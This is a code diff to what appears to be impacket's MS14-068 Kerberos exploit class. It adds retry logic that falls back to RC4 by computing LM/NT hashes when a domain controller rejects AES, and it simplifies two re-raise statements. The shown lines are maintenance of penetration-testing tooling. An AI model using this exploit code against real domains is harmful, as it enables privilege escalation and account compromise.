@@ -984,7 +984,24 @@ class MS14_068():
 
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         while True: 
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
+            try:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
+            except KerberosError, e:
+                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                    # We might face this if the target does not support AES (most probably
+                    # Windows XP). So, if that's the case we'll force using RC4 by converting
+                    # the password to lm/nt hashes and hope for the best. If that's already
+                    # done, byebye.
+                    if self.__lmhash is '' and self.__nthash is '':
+                        from impacket.ntlm import compute_lmhash, compute_nthash
+                        self.__lmhash = compute_lmhash(self.__password) 
+                        self.__nthash = compute_nthash(self.__password) 
+                        continue
+                    else:
+                        raise 
+                else:
+                    raise 
+
             # So, we have the TGT, now extract the new session key and finish
             asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
@@ -1030,9 +1047,9 @@ class MS14_068():
                         self.__lmhash = compute_lmhash(self.__password) 
                         self.__nthash = compute_nthash(self.__password) 
                     else:
-                        raise e
+                        raise 
                 else:
-                    raise e
+                    raise 
             else:
                 # Everything went well, let's save the ticket if asked and leave
                 if self.__writeTGT is not None:
